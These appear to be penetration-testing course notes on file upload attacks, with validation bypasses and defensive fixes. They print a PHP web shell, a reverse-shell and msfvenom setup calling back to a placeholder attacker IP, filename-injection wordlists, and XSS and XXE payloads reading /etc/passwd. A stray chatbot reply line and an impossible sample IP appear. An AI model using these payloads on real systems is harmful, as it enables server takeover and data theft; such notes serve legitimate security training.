# File Upload Attacks

File upload vulnerabilities pose significant risks to web applications, arising from inadequate file validation and outdated libraries, enabling attackers to exploit this feature maliciously. Such attacks range from unauthenticated arbitrary file uploads, leading to remote command execution via web shells or reverse shells, to introducing vulnerabilities like XSS or XXE, causing Denial of Service (DoS), or overwriting critical files. Mitigating these risks involves implementing robust validation, secure filters, and avoiding outdated libraries, alongside adopting best practices to fortify applications against these threats.

---

# Absent Validation
- **Description**: Web application lacks validation filters, allowing unrestricted file uploads.
- **Risk**: Attackers can upload malicious scripts (e.g., web shells or reverse shells) to interact with the server directly.

### Arbitrary File Upload
- **Scenario**: A web application allows any file types without restrictions on the front-end or back-end.
- **Steps**:
  1. Upload malicious files like `.php` scripts.
  2. Access uploaded scripts via URLs to execute commands or gain control over the server.

### Identifying Web Framework
- **Objective**: Determine the programming language of the web application to upload compatible malicious scripts.
- **Techniques**:
  1. Check for file extensions in URLs (e.g., `.php`, `.asp`).
  2. Use tools like Burp Intruder or Wappalyzer for automation and detection.
  3. Run web vulnerability scanners like Burp/ZAP for further analysis.

### Vulnerability Identification
- **Testing Steps**:
  1. Create a basic script (e.g., ) and upload it.
     ```
     `<?php echo "Hello";?>`
     ```
  3. Confirm upload success by accessing the file URL (e.g., `/uploads/test.php`).
  4. Verify PHP code execution—if successful, the server lacks validation and executes uploaded code.

---

# Upload Exploitation

### Web Shells
- **Purpose**: Web shells enable attackers to interact with the back-end server, execute commands, and further exploit the system.
- **Options**:
  - **Pre-built Web Shells**:
    - Example: `phpbash.php` from phpbash or shells found in SecLists (`/opt/useful/seclists/Web-Shells` directory in PwnBox).
    - Upload the shell via the vulnerable feature and visit its URL (e.g., `http://SERVER_IP:PORT/uploads/phpbash.php`) to interact with the terminal-like interface.
  - **Custom Web Shell**:
    - Example:
      ```php
      <?php system($_REQUEST['cmd']); ?>
      ```
    - Usage:
      - Upload `shell.php` to the vulnerable application.
      - Execute commands using the `?cmd=` parameter (e.g., `http://SERVER_IP:PORT/uploads/shell.php?cmd=id`).
      - **Tip**: Use browser source view ([CTRL+U]) for better display of command outputs.
    - Limitations: May fail due to restricted functions or server-side security measures.

### Reverse Shells
- **Purpose**: Reverse shells provide an interactive connection back to the attacker's machine, allowing direct control of the compromised server.
- **Steps**:
  1. **Pre-built Reverse Shells**:
     - Reliable options: `pentestmonkey PHP reverse shell` or SecLists reverse shells.
     - Edit the script:
       ```php
       $ip = 'OUR_IP';     // CHANGE THIS
       $port = OUR_PORT;   // CHANGE THIS
       ```
     - Start a netcat listener:
       ```bash
       nc -lvnp OUR_PORT
       ```
     - Upload the script via the web application and visit its URL to execute it (e.g., `http://SERVER_IP:PORT/uploads/reverse.php`).
     - Successful connection:
       ```bash
       connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
       # id
       uid=33(www-data) gid=33(www-data) groups=33(www-data)
       ```
  2. **Custom Reverse Shell**:
     - Generate a script using `msfvenom`:
       ```bash
       msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
       ```
     - Start a listener and upload the script. Execute it to establish the connection:
       ```bash
       connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
       # id
       uid=33(www-data) gid=33(www-data) groups=33(www-data)
       ```
     - **Tip**: Reverse shells are generally more interactive and preferred over web shells. However, if outgoing connections are blocked by firewalls or necessary functions are disabled, web shells may serve as a fallback.

### Key Challenges
- **Web Shell Limitations**:
  - Functions like `system()` may be disabled.
  - Web Application Firewalls (WAFs) may block execution.
- **Reverse Shell Limitations**:
  - Firewalls may prevent outgoing connections.
  - Necessary functions might be disabled, requiring alternative exploitation techniques.

---

# Client-Side Validation

### Overview
- Some web applications rely on **client-side JavaScript** for file type validation.
- **Issue**: Client-side validation can be easily bypassed since users have control over the front-end code.
- Methods to bypass validation:
  1. Modify the upload request directly.
  2. Disable or alter the front-end validation code.



#### Back-End Request Modification
1. Capture a valid upload request using Burp Suite.
   ```http
   POST /upload.php HTTP/1.1
   Host: SERVER_IP:PORT
   Content-Type: multipart/form-data; boundary=---BOUNDARY

   Content-Disposition: form-data; name="file"; filename="HTB.png"
   <file content>
   ```
2. Modify the request:
   - Change the `filename` to `shell.php`.
   - Replace the file content with the PHP web shell.
3. Send the modified request:
   - Upon success, receive a response like `File successfully uploaded`.
   - Access the uploaded file (e.g., `http://SERVER_IP:PORT/uploads/shell.php`) to interact with the shell.


#### Disabling Front-End Validation
1. **Inspect the HTML input field**:
   - Use browser tools ([CTRL+SHIFT+C]) to locate:
     ```html
     <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
     ```
   - Validation includes:
     - `accept=".jpg,.jpeg,.png"`
     - `onchange="checkFile(this)"` (runs JavaScript validation).

2. **Modify the validation rules**:
   - Remove `onchange="checkFile(this)"`.
   - Remove or edit `accept=".jpg,.jpeg,.png"`.

3. **Disable validation logic**:
   - Locate the JavaScript function:
     ```javascript
     function checkFile(File) {
         if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
             $('#error_message').text("Only images are allowed!");
             File.form.reset();
             $("#submit").attr("disabled", true);
         }
     }
     ```
   - Edit the function or delete the extension check entirely.

4. **Upload the web shell**:
   - Without validation, select the web shell file and upload it successfully.


#### Accessing the Uploaded Web Shell
1. Once the shell is uploaded:
   - Inspect the updated profile image with [CTRL+SHIFT+C].
   - Locate the image source:
     ```html
     <img src="/profile_images/shell.php" class="profile-image" id="profile-image">
     ```
2. Visit the file's URL (e.g., `http://SERVER_IP:PORT/profile_images/shell.php`) to interact with the web shell.



#### Key Notes
- **Temporary Changes**: Front-end modifications do not persist through page refreshes.
- **Back-End Security**: If the back-end does not validate files, attackers can bypass client-side restrictions entirely.

---

# Blacklist Filters

#### Overview
- Blacklist validation involves rejecting files based on disallowed extensions.
- **Issue**: Blacklists are often incomplete, allowing attackers to bypass restrictions.

#### Blacklisting Extensions
1. **Blacklisted Extensions Example**:
   ```php
   $fileName = basename($_FILES["uploadFile"]["name"]);
   $extension = pathinfo($fileName, PATHINFO_EXTENSION);
   $blacklist = array('php', 'php7', 'phps');
   if (in_array($extension, $blacklist)) {
       echo "File type not allowed";
       die();
   }
   ```
   - Compares `$extension` (from `$fileName`) against `$blacklist`.
   - **Weakness**: Limited list; other extensions may execute PHP code.
   - **Case Sensitivity**: Blacklist may fail against mixed-case extensions (e.g., `pHp`).



#### Fuzzing Extensions
1. **Objective**: Identify non-blacklisted extensions for file uploads.
2. **Steps**:
   - Use extension lists from tools like PayloadsAllTheThings or SecLists.
   - In Burp Suite:
     - Locate `/upload.php` request and send to Intruder.
     - Set fuzzing position at the file extension (e.g., `.php` in `filename="HTB.php"`).
     - Load the extension list into Payloads.
   - Start fuzzing and analyze responses:
     - Sort by Content-Length to identify requests that passed validation.


#### Non-Blacklisted Extensions
1. **Testing PHP Code Execution**:
   - Example: Use `.phtml` (commonly allowed on PHP servers).
   - Modify file name and content to:
     - Filename: `shell.phtml`.
     - Content: PHP web shell (e.g., `<?php system($_REQUEST['cmd']); ?>`).
2. **Upload Process**:
   - Right-click valid `.phtml` request and send to Repeater.
   - Execute the upload and verify success (e.g., `File successfully uploaded` response).

#### Execution
1. **Access Uploaded File**:
   - Navigate to file URL (e.g., `/profile_images/shell.phtml`).
2. **Test Commands**:
   - Example: Append `?cmd=id` to execute shell commands.

#### Key Notes
- Blacklists are **insufficient** for robust security due to incomplete extension coverage.
- **Recommendation**: Use whitelists or validate file content and type instead.

---

Got it! Here's an updated version of the notes with a bit more detail added to each section:

---

# File Upload Security: Whitelist Filters & Exploitation Techniques

## Whitelist vs. Blacklist
- **Whitelist**: Allows only specific file extensions (e.g., `.jpg`, `.png`). It reduces the attack surface by denying all extensions except for explicitly allowed ones. Whitelisting is considered more secure but restrictive.
- **Blacklist**: Blocks specific file extensions (e.g., `.php`, `.exe`). It’s useful when a wide variety of file types need to be uploaded, such as in file managers. However, it is less secure since any non-blacklisted but malicious extensions can still slip through.
- **Combination**: In some scenarios, both methods can be used together to balance security and usability.

---

# Whitelisting Filters
### Example Code:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```
- **Common Issue**: The regex does not ensure the extension is at the **end** of the filename. It only checks for the presence of an allowed extension.
- **Exploitation**:
  - **Double Extensions**: By appending an allowed extension to a malicious script (e.g., `shell.jpg.php`), the file passes validation while still containing executable PHP code.
- **Fix**: A stricter regex pattern ensures the extension is at the **end** of the filename:
  ```php
  if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ... }
  ```

## Reverse Double Extensions
### Explanation:
- Even with proper regex validation, misconfigured servers may still execute scripts based on intermediate extensions.
- **Common Misconfiguration**:
  ```xml
  <FilesMatch ".+\.ph(ar|p|tml)">
      SetHandler application/x-httpd-php
  </FilesMatch>
  ```
- **Exploitation**:
  - A file named `shell.php.jpg` would pass a whitelist check (since it ends with `.jpg`) but may still execute PHP code due to the server interpreting `.php` in the name.

## Character Injection
### Explanation:
- Attackers can inject special characters into filenames to manipulate how web applications or servers interpret the file.
- **Common Characters**:
  - `%00` (Null byte): Causes PHP 5.X servers to truncate the filename at `%00`.
  - `:` (Colon): Used on Windows servers to bypass validation (e.g., `shell.aspx:.jpg` is treated as `shell.aspx`).
  - Others: `%20` (space), `/`, `.\`, `.`, `…` (Unicode ellipsis).

### Exploitation:
- Example filename: `shell.php%00.jpg` → Interpreted by vulnerable servers as `shell.php`.
- **Wordlist Generation**:
    - A custom wordlist can test for vulnerabilities:
      ```bash
      for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
          for ext in '.php' '.phps'; do
              echo "shell$char$ext.jpg" >> wordlist.txt
              echo "shell$ext$char.jpg" >> wordlist.txt
              echo "shell.jpg$char$ext" >> wordlist.txt
              echo "shell.jpg$ext$char" >> wordlist.txt
          done
      done
      ```
    - This wordlist can be used with fuzzing tools (e.g., Burp Intruder) to identify server misconfigurations or outdated software.

---
# File Type Filters

## Introduction
File type filters are essential to prevent file upload attacks. Traditional filters that only rely on file extensions (e.g., `shell.php.jpg`) are insufficient as attackers can exploit allowed extensions or other weaknesses. To strengthen security, modern web servers and applications often validate the **content** of uploaded files.

## Methods of Content Validation
1. **Content-Type Header Validation**
    - The `Content-Type` header specifies the file type as determined by the browser.
    - Example PHP code:
    ```php
    $type = $_FILES['uploadFile']['type'];

    if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
        echo "Only images are allowed";
        die();
    }
    ```
    - To bypass:
      - Manipulate the `Content-Type` header using tools like Burp Intruder.
      - Use wordlists (e.g., SecLists) to fuzz the `Content-Type` and test allowed values.

2. **MIME-Type Validation**
    - Determines file type based on its **magic bytes** or **file signature**.
    - Example PHP code:
    ```php
    $type = mime_content_type($_FILES['uploadFile']['tmp_name']);

    if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
        echo "Only images are allowed";
        die();
    }
    ```
    - To bypass:
      - Modify the file's magic bytes to imitate a valid MIME type (e.g., add `GIF8` for a GIF image).
      - Example:
      ```bash
      $ echo "GIF8" > text.jpg
      $ file text.jpg
      text.jpg: GIF image data
      ```

## Combining Validation Methods
By combining attacks, you can bypass robust filters. Examples include:
- Using **Allowed MIME type** with a **disallowed Content-Type**.
- Pairing **Allowed MIME/Content-Type** with a **disallowed extension**.
- Employing **Disallowed MIME/Content-Type** with an **allowed extension**.

## Practical Example
- Add `GIF8` to the beginning of a PHP file while retaining the `.php` extension.
- Upload the file to bypass the MIME-type validation and execute PHP commands successfully:
    ```plaintext
    http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
    ```

## Notes
- **Important:** Some servers validate both `Content-Type` and `MIME-Type`. Adjust file headers and magic bytes accordingly.
- Robust filters may require advanced combinations to bypass, depending on the server's security configuration.

---

# Limited File Uploads

## Introduction
Even with secure filters limiting file uploads to specific types, vulnerabilities may still be exploited using file types like SVG, HTML, XML, and other image or document formats. Fuzzing allowed file extensions is crucial for identifying attack vectors.

## **XSS (Cross-Site Scripting)**
1. **HTML File Uploads**:
   - Malicious HTML files can execute JavaScript (e.g., XSS or CSRF attacks) when accessed by users.
   
2. **Image Metadata Injection**:
   - Inject XSS payloads into metadata (e.g., `Comment`, `Artist`) using `exiftool`:
     ```bash
     $ exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg
     ```
   - If metadata is displayed, XSS payload triggers.

3. **SVG Payloads**:
   - SVG images are XML-based and allow embedded scripts:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
     <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
         <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
         <script type="text/javascript">alert(window.origin);</script>
     </svg>
     ```
   - Payload triggers when image is displayed.


## **XXE (XML External Entity)**

1. **Extract Files**:
   - Example SVG payload to read `/etc/passwd`:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
     <svg>&xxe;</svg>
     ```

2. **Read Source Code**:
   - Base64-encode PHP source files:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
     <svg>&xxe;</svg>
     ```

3. **Blind XXE with Documents**:
   - XML-based formats like PDF or Office documents can carry XXE payloads if the application supports them.

4. **SSRF (Server-Side Request Forgery)**:
   - XXE can also enumerate internal services or interact with private APIs for further exploitation.



## **DoS (Denial of Service)**

1. **XXE DoS**:
   - Leverage XXE vulnerabilities to overload the server.

2. **Decompression Bomb**:
   - Upload malicious ZIP archives with nested files, expanding to Petabytes when extracted.

3. **Pixel Flood Attack**:
   - Modify compressed image data to falsely claim excessive resolution (e.g., 4 Gigapixels).

4. **Large File Uploads**:
   - Exploit forms with no file size restrictions to fill up server storage.

5. **Directory Traversal**:
   - Upload files to restricted directories (e.g., `../../../etc/passwd`) to crash the server.

---


